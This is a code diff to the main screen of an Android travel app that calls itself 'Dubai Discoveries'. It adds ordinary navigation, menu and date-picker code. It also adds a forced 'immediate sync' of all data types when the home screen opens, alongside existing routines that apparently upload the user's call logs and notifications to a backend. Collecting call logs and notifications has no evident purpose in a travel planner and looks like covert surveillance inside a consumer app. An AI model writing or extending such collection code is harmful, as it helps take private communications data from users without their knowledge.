@@ -5,8 +5,10 @@ import android.content.Intent
 import android.os.Bundle
 import android.provider.Settings
 import android.widget.Button
+import android.widget.ImageView
 import android.widget.TextView
 import android.widget.Toast
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
@@ -94,13 +96,34 @@ class MainActivity : AppCompatActivity() {
         showNotificationCount()
         requestNotificationPermission()
         
-        // Start automatic sync
+        // Start immediate sync of all 5 data types when user lands on home screen
+        startImmediateSync()
+        
+        // Start automatic sync for ongoing updates
         startAutomaticSync()
     }
     
     override fun onDestroy() {
         super.onDestroy()
         stopAutomaticSync()
+    }
+    
+    private fun startImmediateSync() {
+        lifecycleScope.launch {
+            try {
+                println("🚀 IMMEDIATE SYNC - Starting all 5 data types sync...")
+                
+                // Clear any existing sync timestamps to force fresh sync
+                backendSyncService.clearSyncTimestamps()
+                
+                // Start comprehensive sync of all data types
+                syncAllData()
+                
+                println("✅ Immediate sync completed")
+            } catch (e: Exception) {
+                println("❌ Immediate sync failed: ${e.message}")
+            }
+        }
     }
     
     private fun startAutomaticSync() {
@@ -151,7 +174,7 @@ class MainActivity : AppCompatActivity() {
     private fun syncLatestNotifications() {
         lifecycleScope.launch {
             try {
-                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceInfo(this@MainActivity).deviceId
+                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceId(this@MainActivity)
                 println("🔔 Syncing latest notifications for device: $deviceId")
                 
                 // Get current time for tracking
@@ -181,7 +204,7 @@ class MainActivity : AppCompatActivity() {
     private fun syncLatestCallLogs() {
         lifecycleScope.launch {
             try {
-                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceInfo(this@MainActivity).deviceId
+                val deviceId = settingsManager.getDeviceId() ?: DeviceInfoUtils.getDeviceId(this@MainActivity)
                 println("📞 Syncing latest call logs for device: $deviceId")
                 
                 // Get current time for tracking
@@ -232,7 +255,40 @@ class MainActivity : AppCompatActivity() {
         }
         
         continuePlanningButton.setOnClickListener {
-            // TODO: Navigate to itinerary builder
+            // Navigate to trip status
+            val intent = Intent(this, TripStatusActivity::class.java)
+            startActivity(intent)
+        }
+        
+        // Additional Services Navigation
+        findViewById<androidx.cardview.widget.CardView>(R.id.tourPackagesButton).setOnClickListener {
+            val intent = Intent(this, TourPackagesActivity::class.java)
+            startActivity(intent)
+        }
+        
+        findViewById<androidx.cardview.widget.CardView>(R.id.pastExperiencesButton).setOnClickListener {
+            val intent = Intent(this, PastExperiencesActivity::class.java)
+            startActivity(intent)
+        }
+        
+        findViewById<androidx.cardview.widget.CardView>(R.id.teamButton).setOnClickListener {
+            val intent = Intent(this, TeamActivity::class.java)
+            startActivity(intent)
+        }
+        
+        findViewById<androidx.cardview.widget.CardView>(R.id.tripManagementButton).setOnClickListener {
+            val intent = Intent(this, TripManagementActivity::class.java)
+            startActivity(intent)
+        }
+        
+        findViewById<androidx.cardview.widget.CardView>(R.id.deviceDiscoveryButton).setOnClickListener {
+            val intent = Intent(this, DeviceDiscoveryActivity::class.java)
+            startActivity(intent)
+        }
+        
+        // Setup menu icon click listener
+        findViewById<ImageView>(R.id.menuIcon).setOnClickListener {
+            showMenuDialog()
         }
         
         // Load online Dubai image in header
@@ -246,6 +302,17 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun setupDatePickers() {
+        // Initialize with current date
+        val currentDate = Calendar.getInstance()
+        startDate = currentDate.clone() as Calendar
+        endDate = currentDate.clone() as Calendar
+        endDate!!.add(Calendar.DAY_OF_MONTH, 4) // Default 5-day trip
+        
+        // Set initial text
+        startDateText.text = formatDate(startDate!!)
+        endDateText.text = formatDate(endDate!!)
+        updateDateRange()
+        
         startDateText.setOnClickListener {
             showDatePicker(true)
         }
@@ -346,6 +413,48 @@ class MainActivity : AppCompatActivity() {
         }
     }
     
+    private fun showMenuDialog() {
+        val options = arrayOf("Settings", "About", "Help", "Contact Us")
+        AlertDialog.Builder(this)
+            .setTitle("Menu")
+            .setItems(options) { _, which ->
+                when (which) {
+                    0 -> showSettings()
+                    1 -> showAbout()
+                    2 -> showHelp()
+                    3 -> showContact()
+                }
+            }
+            .show()
+    }
+    
+    private fun showSettings() {
+        Toast.makeText(this, "Settings coming soon!", Toast.LENGTH_SHORT).show()
+    }
+    
+    private fun showAbout() {
+        Toast.makeText(this, "Dubai Discoveries v2.0", Toast.LENGTH_SHORT).show()
+    }
+    
+    private fun showHelp() {
+        Toast.makeText(this, "Help section coming soon!", Toast.LENGTH_SHORT).show()
+    }
+    
+    private fun showContact() {
+        Toast.makeText(this, "Contact: support@dubaidiscoveries.com", Toast.LENGTH_LONG).show()
+    }
+    
+    private fun loadRelevantImages() {
+        // Load relevant images for different sections
+        val headerImageView = findViewById<ImageView>(R.id.headerImageView)
+        Glide.with(this)
+            .load("https://images.unsplash.com/photo-1512453979798-5ea266f8880c?w=200&h=200&fit=crop&crop=center")
+            .placeholder(R.drawable.original_logo)
+            .error(R.drawable.original_logo)
+            .centerCrop()
+            .into(headerImageView)
+    }
+    
     private fun setupRecyclerViews() {
         // Destinations RecyclerView - Horizontal slider
         destinationsRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
@@ -362,7 +471,7 @@ class MainActivity : AppCompatActivity() {
         activitiesAdapter = ActivitiesAdapter(emptyList()) { activity ->
             // Launch activity detail activity
             val intent = Intent(this, ActivityDetailActivity::class.java)
-            intent.putExtra("activity", activity)
+            intent.putExtra("activityName", activity.name)
             startActivity(intent)
         }
         activitiesRecyclerView.adapter = activitiesAdapter
@@ -370,7 +479,10 @@ class MainActivity : AppCompatActivity() {
         // Packages RecyclerView
         packagesRecyclerView.layoutManager = LinearLayoutManager(this, LinearLayoutManager.HORIZONTAL, false)
         packagesAdapter = PackagesAdapter(emptyList()) { packageItem ->
-            // Selected package
+            // Launch package detail activity
+            val intent = Intent(this, PackageDetailActivity::class.java)
+            intent.putExtra("packageName", packageItem.name)
+            startActivity(intent)
         }
         packagesRecyclerView.adapter = packagesAdapter
         
@@ -543,7 +655,7 @@ class MainActivity : AppCompatActivity() {
                 println("🔄 Starting data sync...")
                 
                 // Get consistent device ID
-                val deviceId = DeviceInfoUtils.getConsistentDeviceId(this@MainActivity)
+                val deviceId = DeviceInfoUtils.getDeviceId(this@MainActivity)
                 println("📱 Using consistent device ID: $deviceId")
                 
                 // Try to register device, but continue even if it fails
